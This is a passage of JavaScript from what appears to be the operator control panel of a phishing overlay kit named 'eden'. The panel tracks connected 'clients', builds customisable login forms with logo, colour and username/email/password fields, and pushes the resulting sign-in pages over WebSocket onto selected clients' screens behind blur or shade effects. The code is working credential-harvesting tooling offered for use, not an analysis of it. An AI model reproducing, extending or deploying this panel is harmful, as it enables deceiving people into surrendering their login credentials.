                                localStorage.setItem('eden-download-from-section', 'download'); 
                                sessionStorage.setItem('eden-download-from-section', 'download');
                                localStorage.setItem('eden-download-intensity', intensity.toString());
                                sessionStorage.setItem('eden-download-intensity', intensity.toString());
                                localStorage.setItem('eden-download-custom-effect', JSON.stringify(data.customEffect));
                                sessionStorage.setItem('eden-download-custom-effect', JSON.stringify(data.customEffect));
                                
                                // Store the effect name separately for easier lookup
                                localStorage.setItem('eden-download-custom-effect-name', effect);
                                sessionStorage.setItem('eden-download-custom-effect-name', effect);
                                
                                console.log('Sending custom effect data to eden.js:', JSON.stringify(data.customEffect));
                                console.log('Full data being sent:', JSON.stringify(data));
                                
                                showDownloadStatusMessage('success', `Using custom effect: ${effect} with intensity ${intensity} for download`);
                            } else {
                                // Effect not found, fallback to blur
                                data.type = 'downloadContent';
                                showDownloadStatusMessage('warning', `Custom effect "${effect}" not found. Using blur effect instead.`);
                            }
                        } catch (error) {
                            console.error('Error loading custom effect:', error);
                            data.type = 'downloadContent';
                            showDownloadStatusMessage('warning', 'Error loading custom effect. Using blur effect instead.');
                        }
                    }
                    
                    // Send to selected clients only
                    sendToSelectedClients(data);
                    
                    // Show status message
                    showDownloadStatusMessage('success', `Displaying "${fileName}" with ${effect} effect to ${selectedClients.length} selected client(s)`);
                    
                    // Auto-reset location
                    if (locationSelected) {
                        locationSelected = false;
                        selectedLocationX = 50;
                        selectedLocationY = 50;
                        document.getElementById('location-button').textContent = 'Choose Location';
                        document.getElementById('reset-location-button').disabled = true;
                    }
                });
                
                // Clean button
                const cleanBtn = document.createElement('button');
                cleanBtn.className = 'btn warning';
                cleanBtn.innerHTML = '<i class="fas fa-eraser"></i> Clean';
                // Use a single event listener that directly calls download_cleanContent
                cleanBtn.addEventListener('click', () => {
                    console.log('Download section clean button clicked');
                    // Direct call to download_cleanContent function in eden.js
                    if (typeof window.download_cleanContent === 'function') {
                        console.log('Calling download_cleanContent');
                        window.download_cleanContent();
                    } else if (typeof window.cleanBlurDisplay === 'function') {
                        console.log('download_cleanContent not found, using cleanBlurDisplay');
                        window.cleanBlurDisplay();
                    } else {
                        // Fallback if function is not available
                        console.log('No clean functions found, using WebSocket');
                        ws.send(JSON.stringify({type: 'cleanContent'}));
                    }
                    showDownloadStatusMessage('success', 'Content cleaned from displays');
                });
                
                // Select button
                const selectBtn = document.createElement('button');
                selectBtn.className = 'btn success select-btn';
                selectBtn.innerHTML = '<i class="fas fa-check"></i> Select';
                selectBtn.dataset.selected = 'false';
                selectBtn.addEventListener('click', () => {
                    const isSelected = selectBtn.dataset.selected === 'true';
                    
                    if (isSelected) {
                        selectBtn.dataset.selected = 'false';
                        selectBtn.innerHTML = '<i class="fas fa-check"></i> Select';
                        fileItem.classList.remove('selected');
                        
                        ws.send(JSON.stringify({
                            type: 'fileDeselected',
                            fileName: fileName
                        }));
                        
                        // Remove from localStorage
                        try {
                            const existing = JSON.parse(localStorage.getItem('eden-download-selected-files') || '[]');
                            localStorage.setItem('eden-download-selected-files', 
                                JSON.stringify(existing.filter(f => f.fileName !== fileName)));
                            localStorage.removeItem(`eden-download-selected-${fileName}`);
                        } catch(e) {}
                    } else {
                        selectBtn.dataset.selected = 'true';
                        selectBtn.innerHTML = '<i class="fas fa-check-double"></i> Selected';
                        fileItem.classList.add('selected');
                        
                        ws.send(JSON.stringify({
                            type: 'fileSelected',
                            fileName: fileName,
                            content: content
                        }));
                        
                        // Add to localStorage
                        try {
                            const existing = JSON.parse(localStorage.getItem('eden-download-selected-files') || '[]');
                            const index = existing.findIndex(f => f.fileName === fileName);
                            if (index !== -1) {
                                existing[index] = { fileName, content };
                            } else {
                                existing.push({ fileName, content });
                            }
                            localStorage.setItem('eden-download-selected-files', JSON.stringify(existing));
                            localStorage.setItem(`eden-download-selected-${fileName}`, content);
                        } catch(e) {}
                    }
                });
                
                // Delete button
                const deleteBtn = document.createElement('button');
                deleteBtn.className = 'btn danger';
                deleteBtn.innerHTML = '<i class="fas fa-trash-alt"></i>';
                deleteBtn.addEventListener('click', () => {
                    if(confirm(`Are you sure you want to delete "${fileName}"?`)) {
                        container.removeChild(fileItem);
                        
                        // Update localStorage
                        try {
                            const files = [];
                            document.querySelectorAll('.blur-file-item').forEach(item => {
                                if (item.querySelector('.blur-file-name').textContent !== fileName) {
                                    files.push({
                                        fileName: item.querySelector('.blur-file-name').textContent,
                                        content: item.querySelector('.blur-file-content').textContent
                                    });
                                }
                            });
                            localStorage.setItem('eden-download-files', JSON.stringify(files));
                        } catch(e) {}
                    }
                });
                
                btnGroup.appendChild(displayBtn);
                btnGroup.appendChild(cleanBtn);
                btnGroup.appendChild(selectBtn);
                btnGroup.appendChild(deleteBtn);
                
                fileItem.appendChild(nameEl);
                fileItem.appendChild(contentEl);
                fileItem.appendChild(btnGroup);
                
                container.appendChild(fileItem);
                
                if (saveFiles) {
                    try {
                        const files = [];
                        document.querySelectorAll('.blur-file-item').forEach(item => {
                            files.push({
                                fileName: item.querySelector('.blur-file-name').textContent,
                                content: item.querySelector('.blur-file-content').textContent
                            });
                        });
                        localStorage.setItem('eden-download-files', JSON.stringify(files));
                    } catch(e) {}
                }
            }
            
            function loadFiles() {
                try {
                    // Load files
                    const filesJson = localStorage.getItem('eden-download-files');
                    if (filesJson) {
                        const files = JSON.parse(filesJson);
                        files.forEach(file => {
                            addFileToList(file.fileName, file.content, false);
                        });
                    }
                    
                    // Load selected state
                    const selectedJson = localStorage.getItem('eden-download-selected-files');
                    if (selectedJson) {
                        const selected = JSON.parse(selectedJson);
                        document.querySelectorAll('.blur-file-item').forEach(item => {
                            const fileName = item.querySelector('.blur-file-name').textContent;
                            if (selected.some(f => f.fileName === fileName)) {
                                const selectBtn = item.querySelector('.select-btn');
                                if (selectBtn) {
                                    selectBtn.dataset.selected = 'true';
                                    selectBtn.innerHTML = '<i class="fas fa-check-double"></i> Selected';
                                    item.classList.add('selected');
                                }
                            }
                        });
                    }
                } catch(e) {}
            }
        }
        
        // Setup custom template functionality
        function setupCustomSection() {
            // Initialize custom section variables
            const templateName = document.getElementById('templateName');
            const logoText = document.getElementById('logoText');
            const logoUrl = document.getElementById('logoUrl');
            const containerColor = document.getElementById('containerColor');
            const colorCode = document.getElementById('colorCode');
            const loginButtonColor = document.getElementById('loginButtonColor');
            const buttonColorCode = document.getElementById('buttonColorCode');
            const textColor = document.getElementById('textColor');
            const textColorCode = document.getElementById('textColorCode');
            const buttonText = document.getElementById('buttonText');
            const formStyle = document.getElementById('formStyle');
            const formFieldsContainer = document.getElementById('formFieldsContainer');
            const templatePreview = document.getElementById('templatePreview');
            const sendTemplateBtn = document.getElementById('sendTemplateBtn');
            const resetTemplateBtn = document.getElementById('resetTemplateBtn');
            const addFieldBtn = document.getElementById('addFieldBtn');
            const templateWidth = document.getElementById('templateWidth');
            const templateHeight = document.getElementById('templateHeight');
            const autoHeightCheckbox = document.getElementById('autoHeight');
            const makeRequiredFields = document.getElementById('makeRequiredFields');
            const addRememberMe = document.getElementById('addRememberMe');
            const addForgotPassword = document.getElementById('addForgotPassword');
            
            // Update color code when color picker changes
            containerColor.addEventListener('input', function() {
                colorCode.value = this.value;
                updatePreview();
            });
            
            // Update color picker when color code changes
            colorCode.addEventListener('input', function() {
                containerColor.value = this.value;
                updatePreview();
            });
            
            // Update button color code when color picker changes
            loginButtonColor.addEventListener('input', function() {
                buttonColorCode.value = this.value;
                updatePreview();
            });
            
            // Update button color picker when color code changes
            buttonColorCode.addEventListener('input', function() {
                loginButtonColor.value = this.value;
                updatePreview();
            });
            
            // Update text color code when color picker changes
            textColor.addEventListener('input', function() {
                textColorCode.value = this.value;
                updatePreview();
            });
            
            // Update text color picker when color code changes
            textColorCode.addEventListener('input', function() {
                textColor.value = this.value;
                updatePreview();
            });
            
            // Toggle height input based on auto height checkbox
            autoHeightCheckbox.addEventListener('change', function() {
                templateHeight.disabled = this.checked;
                updatePreview();
            });
            
            // Update preview when checkboxes change
            makeRequiredFields.addEventListener('change', updatePreview);
            addRememberMe.addEventListener('change', updatePreview);
            addForgotPassword.addEventListener('change', updatePreview);
            
            // Update preview when dropdown selections change
            formStyle.addEventListener('change', updatePreview);
            
            // Add field button click handler
            addFieldBtn.addEventListener('click', function() {
                addFormField();
            });
            
            // Add event listeners for live preview
            templateName.addEventListener('input', updatePreview);
            logoText.addEventListener('input', updatePreview);
            logoUrl.addEventListener('input', updatePreview);
            buttonText.addEventListener('input', updatePreview);
            templateWidth.addEventListener('input', updatePreview);
            templateHeight.addEventListener('input', updatePreview);
            
            // Send button click handler
            sendTemplateBtn.addEventListener('click', function() {
                sendCustomTemplate();
            });
            
            // Send to download button click handler
            document.getElementById('sendToDownloadBtn').addEventListener('click', function() {
                sendToDownload();
            });
            
            // Reset button click handler
            resetTemplateBtn.addEventListener('click', function() {
                resetCustomForm();
            });
            
            // Function to reset form to default values
            function resetCustomForm() {
                templateName.value = '';
                logoText.value = 'LOGO';
                logoUrl.value = '';
                containerColor.value = '#ffffff';
                colorCode.value = '#ffffff';
                loginButtonColor.value = '#0066ff';
                buttonColorCode.value = '#0066ff';
                textColor.value = '#333333';
                textColorCode.value = '#333333';
                buttonText.value = 'Sign In';
                formStyle.value = 'standard';
                templateWidth.value = 400;
                templateHeight.value = 400;
                autoHeightCheckbox.checked = true;
                templateHeight.disabled = true;
                makeRequiredFields.checked = false;
                addRememberMe.checked = false;
                addForgotPassword.checked = false;
                
                // Clear all form fields except the first one
                const fieldRows = formFieldsContainer.querySelectorAll('.field-row');
                for (let i = 1; i < fieldRows.length; i++) {
                    formFieldsContainer.removeChild(fieldRows[i]);
                }
                
                // Reset the first field to username
                const firstSelect = formFieldsContainer.querySelector('select');
                if (firstSelect) {
                    firstSelect.value = 'username';
                }
                
                updatePreview();
            }
            
            // Function to add a new form field
            function addFormField() {
                const fieldRow = document.createElement('div');
                fieldRow.className = 'field-row';
                
                const fieldSelect = document.createElement('div');
                fieldSelect.className = 'field-select';
                
                const select = document.createElement('select');
                select.className = 'form-control';
                select.innerHTML = `
                    <option value="username">Username</option>
                    <option value="email">Email</option>
                    <option value="password">Password</option>
                `;
                
                fieldSelect.appendChild(select);
                
                const removeBtn = document.createElement('button');
                removeBtn.className = 'btn btn-small';
                removeBtn.innerHTML = '<i class="fas fa-trash"></i>';
                removeBtn.addEventListener('click', function() {
                    formFieldsContainer.removeChild(fieldRow);
                    updatePreview();
                });
                
                fieldRow.appendChild(fieldSelect);
                fieldRow.appendChild(removeBtn);
                
                formFieldsContainer.appendChild(fieldRow);
                
                // Update the preview after adding a field
                updatePreview();
                
                // Add change event to the new select
                select.addEventListener('change', updatePreview);
            }
            
            // Function to update the live preview
            function updatePreview() {
                const name = templateName.value || 'My Template';
                const logo = logoText.value || 'LOGO';
                const imgUrl = logoUrl.value;
                const bgColor = containerColor.value;
                const btnColor = loginButtonColor.value;
                const txtColor = textColor.value;
                const btnText = buttonText.value || 'Sign In';
                const formDesign = formStyle.value;
                const width = templateWidth.value || 400;
                const height = templateHeight.value || 400;
                const useAutoHeight = autoHeightCheckbox.checked;
                const isRequired = makeRequiredFields.checked;
                const hasRememberMe = addRememberMe.checked;
                const hasForgotPassword = addForgotPassword.checked;
                
                // Get all form fields
                const fields = [];
                const fieldSelects = formFieldsContainer.querySelectorAll('select');
                fieldSelects.forEach(select => {
                    fields.push(select.value);
                });
                
                // Set form style based on selection
                let formBorderRadius = '8px';
                let formBoxShadow = '0 4px 10px rgba(0,0,0,0.1)';
                let inputBorderRadius = '4px';
                let inputBorder = '1px solid #ddd';
                let inputBoxShadow = 'none';
                
                switch(formDesign) {
                    case 'rounded':
                        formBorderRadius = '16px';
                        inputBorderRadius = '20px';
                        break;
                    case 'flat':
                        formBorderRadius = '0';
                        formBoxShadow = 'none';
                        inputBorderRadius = '0';
                        inputBorder = '0';
                        inputBoxShadow = '0 1px 0 rgba(0,0,0,0.2)';
                        break;
                    case 'shadow':
                        formBoxShadow = '0 10px 30px rgba(0,0,0,0.2)';
                        inputBoxShadow = '0 2px 5px rgba(0,0,0,0.1) inset';
                        break;
                }
                
                // Generate the inner content HTML
                let innerHtml = `
                    <div style="padding: 20px; background-color: ${bgColor}; border-radius: ${formBorderRadius}; box-shadow: ${formBoxShadow};">
                        <div style="text-align: center; margin-bottom: 20px;">
                `;
                
                // Add logo image or text
                if (imgUrl) {
                    innerHtml += `<img src="${imgUrl}" alt="${logo}" style="max-height: 60px; max-width: 100%;">`;  
                } else {
                    innerHtml += `<h2 style="font-size: 24px; color: ${txtColor};">${logo}</h2>`;
                }
                
                innerHtml += `
                        </div>
                        <form style="display: flex; flex-direction: column;">
                `;
                
                // Add form fields
                fields.forEach(field => {
                    const isPassword = field === 'password';
                    const fieldLabel = field.charAt(0).toUpperCase() + field.slice(1);
                    
                    innerHtml += `
                        <div style="margin-bottom: 15px;">
                            <label style="display: block; margin-bottom: 5px; font-size: 14px; color: ${txtColor};">${fieldLabel}</label>
                            <input type="${isPassword ? 'password' : 'text'}" name="${field}" placeholder="Enter your ${field}" ${isRequired ? 'required' : ''} style="width: 100%; padding: 10px; border: ${inputBorder}; border-radius: ${inputBorderRadius}; box-shadow: ${inputBoxShadow};">
                        </div>
                    `;
                });
                
                // Add remember me checkbox if enabled
                if (hasRememberMe) {
                    innerHtml += `
                        <div style="margin-bottom: 15px;">
                            <label style="display: flex; align-items: center; color: ${txtColor}; font-size: 14px;">
                                <input type="checkbox" style="margin-right: 8px;"> Remember me
                            </label>
                        </div>
                    `;
                }
                
                // Add submit button
                innerHtml += `
                            <button type="submit" style="background-color: ${btnColor}; color: white; border: none; padding: 12px; border-radius: ${inputBorderRadius}; cursor: pointer; font-weight: bold; margin-top: 10px;">
                                ${btnText}
                            </button>
                `;
                
                // Add forgot password link if enabled
                if (hasForgotPassword) {
                    innerHtml += `
                            <div style="text-align: center; margin-top: 15px;">
                                <a href="#" style="color: ${btnColor}; text-decoration: none; font-size: 14px;">Forgot password?</a>
                            </div>
                    `;
                }
                
                innerHtml += `
                        </form>
                    </div>
                `;
                
                // Wrap the content in a container with the specified width and height
                const previewHtml = `
                    <div style="max-width: ${width}px; ${!useAutoHeight ? `height: ${height}px;` : ''} margin: 0 auto; overflow: auto;">
                        ${innerHtml}
                    </div>
                `;
                
                templatePreview.innerHTML = previewHtml;
            }
            
            // Function to send the custom template to the blur section
            function sendCustomTemplate() {
                if (!templateName.value) {
                    alert('Please enter a template name');
                    return;
                }
                
                // Get the template width and height
                const width = templateWidth.value || 400;
                let height = templateHeight.value || 400;
                const useAutoHeight = autoHeightCheckbox.checked;
                
                if (useAutoHeight) {
                    height = 'auto';
                }
                
                // Generate the HTML content
                const name = templateName.value;
                
                // Get all the custom settings
                const isRequired = makeRequiredFields.checked;
                const btnColor = loginButtonColor.value;
                const txtColor = textColor.value;
                const btnText = buttonText.value || 'Sign In';
                const formDesign = formStyle.value;
                const hasRememberMe = addRememberMe.checked;
                const hasForgotPassword = addForgotPassword.checked;
                const bgColor = containerColor.value; // Fixed: This was missing
                
                // Set form style based on selection
                let formBorderRadius = '8px';
                let formBoxShadow = '0 4px 10px rgba(0,0,0,0.1)';
                let inputBorderRadius = '4px';
                let inputBorder = '1px solid #ddd';
                let inputBoxShadow = 'none';
                
                switch(formDesign) {
                    case 'rounded':
                        formBorderRadius = '16px';
                        inputBorderRadius = '20px';
                        break;
                    case 'flat':
                        formBorderRadius = '0';
                        formBoxShadow = 'none';
                        inputBorderRadius = '0';
                        inputBorder = '0';
                        inputBoxShadow = '0 1px 0 rgba(0,0,0,0.2)';
                        break;
                    case 'shadow':
                        formBoxShadow = '0 10px 30px rgba(0,0,0,0.2)';
                        inputBoxShadow = '0 2px 5px rgba(0,0,0,0.1) inset';
                        break;
                }
                
                // Generate a complete HTML document with width and height settings
                const fullHtmlContent = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${name}</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
        }
        .template-container {
            width: ${width}px;
            ${height !== 'auto' ? `height: ${height}px;` : 'height: auto;'}
            margin: 0 auto;
            overflow: auto;
        }
        .form-container {
            padding: 20px;
            background-color: ${bgColor};
            border-radius: ${formBorderRadius};
            box-shadow: ${formBoxShadow};
        }
        .form-heading {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-heading h2 {
            font-size: 24px;
            color: ${txtColor};
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: ${txtColor};
        }
        .form-input {
            width: 100%;
            padding: 10px;
            border: ${inputBorder};
            border-radius: ${inputBorderRadius};
            box-shadow: ${inputBoxShadow};
            box-sizing: border-box;
        }
        .form-checkbox {
            display: flex;
            align-items: center;
            color: ${txtColor};
            font-size: 14px;
        }
        .form-checkbox input {
            margin-right: 8px;
        }
        .login-button {
            background-color: ${btnColor};
            color: white;
            border: none;
            padding: 12px;
            border-radius: ${inputBorderRadius};
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
            width: 100%;
        }
        .forgot-password {
            text-align: center;
            margin-top: 15px;
        }
        .forgot-password a {
            color: ${btnColor};
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="template-container">
        ${templatePreview.innerHTML.replace(/^\s+<div style="max-width: .*?overflow: auto;">\s+/s, '').replace(/\s+<\/div>\s+$/s, '')}
    </div>
</body>
</html>`;
                
                // Create a filename with HTML extension
                const fileName = name.replace(/\s+/g, '-').toLowerCase() + '.html';
                
                try {
                    // Directly access the localStorage and add the file
                    const blurStorageKey = 'eden-blur-files';
                    let files = {};
                    
                    try {
                        const savedFiles = localStorage.getItem(blurStorageKey);
                        if (savedFiles) {
                            files = JSON.parse(savedFiles);
                        }
                    } catch (error) {
                        console.error('Error loading blur files:', error);
                    }
                    
                    // Add the new file
                    files[fileName] = fullHtmlContent;
                    
                    // Save back to localStorage
                    localStorage.setItem(blurStorageKey, JSON.stringify(files));
                    
                    // Try to refresh the blur files display
                    if (typeof window.renderBlurFiles === 'function') {
                        window.renderBlurFiles();
                    }
                    
                    // Show success message
                    alert(`Template "${name}" successfully saved to the Blur section!`);
                    
                    // Switch to the blur section to show the result
                    const blurLink = document.querySelector('a[data-section="blur"]');
                    if (blurLink) {
                        blurLink.click();
                    }
                } catch (error) {
                    console.error('Error saving template to blur section:', error);
                    alert('Error saving template: ' + error.message);
                }
            }
            
            // Function to send template to download section
            function sendToDownload() {
                if (!templateName.value) {
                    alert('Please enter a template name');
                    return;
                }
                
                const width = templateWidth.value || 400;
                let height = templateHeight.value || 400;
                if (autoHeightCheckbox.checked) {
                    height = 'auto';
                }
                
                // Generate the HTML content
                const name = templateName.value;
                
                // Get the required fields setting
                const isRequired = makeRequiredFields.checked;
                const btnColor = loginButtonColor.value;
                
                // Generate a complete HTML document
                const fullHtmlContent = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${name}</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
        }
        .template-container {
            width: ${width}px;
            ${height !== 'auto' ? `height: ${height}px;` : 'height: auto;'}
            margin: 0 auto;
            overflow: auto;
        }
        .login-button {
            background-color: ${btnColor};
            color: white;
            border: none;
            padding: 12px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="template-container">
        ${templatePreview.innerHTML.replace(/^\s+<div style="max-width: .*?overflow: auto;">\s+/s, '').replace(/\s+<\/div>\s+$/s, '')}
    </div>
</body>
</html>`;
                
                // Create a filename with HTML extension
                const fileName = name.replace(/\s+/g, '-').toLowerCase() + '.html';
                
                try {
                    // Direct approach - modify control.php's DOM directly
                    // First, get the iframe that contains control.php
                    const downloadFrame = document.querySelector('#downloadFrame');
                    
                    if (downloadFrame && downloadFrame.contentWindow) {
                        // Get the files container directly from the iframe
                        const container = downloadFrame.contentWindow.document.getElementById('download-files-container');
                        
                        if (container && typeof downloadFrame.contentWindow.addFileToList === 'function') {
                            // Use the iframe's own addFileToList function
                            downloadFrame.contentWindow.addFileToList(fileName, fullHtmlContent);
                            
                            // Show success message
                            alert(`Template "${name}" saved to Download section successfully`);
                            
                            // Navigate to download section
                            const downloadNavLink = document.querySelector('a[data-section="download"]');
                            if (downloadNavLink) {
                                downloadNavLink.click();
                            }
                            return;
                        }
                    }
                    
                    // Fallback: Use localStorage + WebSocket approach
                    
                    // Update localStorage
                    let files = [];
                    const filesJson = localStorage.getItem('eden-download-files');
                    if (filesJson) {
                        try {
                            files = JSON.parse(filesJson);
                        } catch (e) {
                            files = [];
                        }
                    }
                    
                    files.push({
                        fileName: fileName,
                        content: fullHtmlContent
                    });
                    
                    localStorage.setItem('eden-download-files', JSON.stringify(files));
                    
                    // Send WebSocket message to add the file
                    if (ws && ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({
                            type: 'addDownloadFile',
                            fileName: fileName,
                            content: fullHtmlContent
                        }));
                    }
                    
                    // Show success message
                    alert(`Template "${name}" saved to Download section successfully`);
                    
                    // Navigate to download section
                    const downloadNavLink = document.querySelector('a[data-section="download"]');
                    if (downloadNavLink) {
                        downloadNavLink.click();
                    }
                } catch (error) {
                    console.error('Error saving template to download section:', error);
                    alert('Error saving template. Please try again.');
                }
            }
            
            // Function to reset the form
            function resetCustomForm() {
                templateName.value = '';
                logoText.value = '';
                logoUrl.value = '';
                containerColor.value = '#ffffff';
                colorCode.value = '#ffffff';
                templateWidth.value = '400';
                templateHeight.value = '400';
                autoHeightCheckbox.checked = true;
                templateHeight.disabled = true;
                
                // Remove all form fields except the first one
                while (formFieldsContainer.children.length > 1) {
                    formFieldsContainer.removeChild(formFieldsContainer.lastChild);
                }
                
                // Reset the first form field
                const firstSelect = formFieldsContainer.querySelector('select');
                if (firstSelect) {
                    firstSelect.value = 'username';
                }
                
                // Update the preview
                updatePreview();
            }
            
            // Initialize with a default preview
            updatePreview();
            
            // Set initial state of height input
            templateHeight.disabled = autoHeightCheckbox.checked;
        }
        
        // Blur functionality
        function setupBlurSection() {
            // Make these variables accessible globally
            window.blurStorageKey = 'eden-blur-files';
            window.blurFilesContainer = document.getElementById('blurFilesContainer');
            window.blurUploadArea = document.getElementById('blurUploadArea');
            window.blurFileInput = document.getElementById('blurFileInput');
            window.blurEffectType = document.getElementById('blurEffectType');
            window.blurIntensity = document.getElementById('blurIntensity');
            window.blurIntensityValue = document.getElementById('blurIntensityValue');
            window.clearBlurBtn = document.getElementById('clearBlurBtn');
            
            // Load saved files from localStorage - make this global
            window.loadBlurFiles = function() {
                try {
                    const savedFiles = localStorage.getItem(window.blurStorageKey);
                    return savedFiles ? JSON.parse(savedFiles) : {};
                } catch (error) {
                    console.error('Error loading blur files from localStorage:', error);
                    return {};
                }
            };
            
            // Save files to localStorage - make this global
            window.saveBlurFiles = function(files) {
                try {
                    localStorage.setItem(window.blurStorageKey, JSON.stringify(files));
                } catch (error) {
                    console.error('Error saving blur files to localStorage:', error);
                }
            };
            
            // Render the file list - make this global
            window.renderBlurFiles = function() {
                const files = window.loadBlurFiles();
                window.blurFilesContainer.innerHTML = '';
                
                if (Object.keys(files).length === 0) {
                    window.blurFilesContainer.innerHTML = '<div class="empty-message">No files uploaded yet</div>';
                    return;
                }
                
                for (const [name, content] of Object.entries(files)) {
                    const fileItem = document.createElement('div');
                    fileItem.className = 'blur-file-item';
                    
                    const fileName = document.createElement('div');
                    fileName.className = 'blur-file-name';
                    fileName.textContent = name;
                    
                    const fileContent = document.createElement('div');
                    fileContent.className = 'blur-file-content';
                    fileContent.textContent = content;
                    
                    const buttonGroup = document.createElement('div');
                    buttonGroup.className = 'blur-button-group';
                    
                    const displayBtn = document.createElement('button');
                    displayBtn.className = 'btn primary';
                    displayBtn.innerHTML = '<i class="fas fa-eye"></i> Display';
                    displayBtn.addEventListener('click', () => window.displayBlurFile(name, content));
                    
                    const cleanBtn = document.createElement('button');
                                          cleanBtn.className = 'btn warning';
                      cleanBtn.innerHTML = '<i class="fas fa-eraser"></i> Clean';
                      cleanBtn.addEventListener('click', () => {
                          // Use the cleanBlurDisplay function if available
                          if (typeof window.cleanBlurDisplay === 'function') {
                              window.cleanBlurDisplay();
            } else {
                              // Fallback to direct WebSocket
                              if (typeof ws !== 'undefined' && ws.readyState === WebSocket.OPEN) {
                                  ws.send(JSON.stringify({type: 'cleanContent'}));
                              }
                          }
                      });
                    
                    const deleteBtn = document.createElement('button');
                    deleteBtn.className = 'btn danger';
                    deleteBtn.innerHTML = '<i class="fas fa-trash-alt"></i>';
                    deleteBtn.addEventListener('click', () => window.deleteBlurFile(name));
                    
                    buttonGroup.appendChild(displayBtn);
                    buttonGroup.appendChild(cleanBtn);
                    buttonGroup.appendChild(deleteBtn);
                    
                    fileItem.appendChild(fileName);
                    fileItem.appendChild(fileContent);
                    fileItem.appendChild(buttonGroup);
                    
                    window.blurFilesContainer.appendChild(fileItem);
                }
            };
            
            // Add a new file to the list - make this global
            window.addBlurFile = function(name, content) {
                const files = window.loadBlurFiles();
                files[name] = content;
                window.saveBlurFiles(files);
                window.renderBlurFiles();
            };
            
            // Delete a file from the list - make this global
            window.deleteBlurFile = function(name) {
                if (confirm(`Are you sure you want to delete the file "${name}"?`)) {
                    const files = window.loadBlurFiles();
                    delete files[name];
                    window.saveBlurFiles(files);
                    window.renderBlurFiles();
                }
            };
            
            // Display a file with blur effect - make this global
            window.displayBlurFile = function(name, content) {
                const effect = window.blurEffectType.value;
                const intensity = parseInt(window.blurIntensity.value);
                
                // First check if any clients are selected
                const selectedClients = Object.keys(clients).filter(key => clients[key].selected && clients[key].status === 'online');
                
                if (selectedClients.length === 0) {
                    showStatusMessage('warning', 'No clients selected. Please select at least one client from the Connection section.');
                    return;
                }
                
                // Get saved location coordinates
                const locationX = parseInt(localStorage.getItem('eden_blur_location_x') || '50');
                const locationY = parseInt(localStorage.getItem('eden_blur_location_y') || '50');
                
                // Send message to connected clients using the existing WebSocket
                if (ws && ws.readyState === WebSocket.OPEN) {
                    // Create message object
                    const message = {
                        type: 'blurContent',
                        content: content,
                        fileName: name,
                        location: {
                            x: locationX,
                            y: locationY
                        }
                    };
                    
                    // Check if it's a built-in effect or custom effect
                    if (['blur', 'shade', 'none'].includes(effect)) {
                        // Built-in effect
                        message.effect = effect;
                        message.intensity = intensity;
                        showStatusMessage('success', `Displaying "${name}" with ${effect} effect (intensity: ${intensity})`);
                    } else {
                        // Custom effect - fetch from localStorage
                        const effectsKey = 'eden-custom-effects';
                        try {
                            const effects = JSON.parse(localStorage.getItem(effectsKey) || '{}');
                            const customEffect = effects[effect];
                            
                            if (customEffect) {
                                message.effect = 'custom';
                                message.intensity = intensity;
                                message.customEffect = {
                                    name: effect,
                                    content: customEffect.content,
                                    type: customEffect.type
                                };
                                showStatusMessage('success', `Displaying "${name}" with custom effect: ${effect} (intensity: ${intensity})`);
                            } else {
                                // Effect not found, fallback to blur
                                message.effect = 'blur';
                                message.intensity = intensity;
                                showStatusMessage('warning', `Custom effect "${effect}" not found. Using blur effect instead.`);
                            }
                        } catch (error) {
                            console.error('Error loading custom effects:', error);
                            message.effect = 'blur';
                            message.intensity = intensity;
                            showStatusMessage('warning', 'Error loading custom effect. Using blur effect instead.');
                        }
                    }
                    
                    // Send the message to clients
                    sendToSelectedClients(message);
                    
                    // Reset location to center after display
                    resetLocationToDefault();
                } else {
                    showStatusMessage('error', 'WebSocket connection is not available');
                }
            };
            
            // Reset location to default (center)
            function resetLocationToDefault() {
                localStorage.setItem('eden_blur_location_x', '50');
                localStorage.setItem('eden_blur_location_y', '50');
                
                // Update UI if location picker is open
                if (locationMarker) {
                    locationMarker.style.left = '50%';
                    locationMarker.style.top = '50%';
                    locationMarker.style.display = 'block';
                }
                if (locationX && locationY) {
                    locationX.textContent = '50';
                    locationY.textContent = '50';
                }
                
                showStatusMessage('info', 'Location reset to center');
            }
            
            // Clean the display (removes blur effect on target clients but keeps templates) - make this global
                                        window.cleanBlurDisplay = function() {
                  // Send WebSocket message if connection is available
                  if (ws && ws.readyState === WebSocket.OPEN) {
                      const message = {
                         type: 'cleanContent',
                          immediate: true // Signal to immediately remove the overlay
                      };
                      
                      // Send to selected clients
                      sendToSelectedClients(message);
                      showStatusMessage('success', 'Blur effect removed from client displays');
                  } else {
                      showStatusMessage('warning', 'WebSocket connection is not available');
                  }
                  
                  // Always clean up DOM elements even if WebSocket is not available
                  const elementsToRemove = [
                      'eden-blur-overlay',
                      'eden-content-container',
                      'eden-download-overlay',
                      'eden-download-container'
                  ];
                  
                  elementsToRemove.forEach(id => {
                      const element = document.getElementById(id);
                      if (element) element.parentNode.removeChild(element);
                  });
                  
                  // Clear storage items
                  const storageItems = [
                      'eden-active-content',
                      'eden-active-filename',
                      'eden-effect-type',
                      'eden-from-section',
                      'eden-pending-content',
                      'eden-pending-filename'
                  ];
                  
                  storageItems.forEach(item => {
                      localStorage.removeItem(item);
                      sessionStorage.removeItem(item);
                  });
                  
                  return true;
              };
            
            // Show status message
            function showStatusMessage(type, message) {
                const statusEl = document.createElement('div');
                statusEl.className = `status-message ${type}`;
                statusEl.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : 'exclamation-circle'}"></i> ${message}`;
                statusEl.style.display = 'block';
                
                // Find or create status container in blur section
                let statusContainer = document.querySelector('.blur-section .status-container');
                if (!statusContainer) {
                    statusContainer = document.createElement('div');
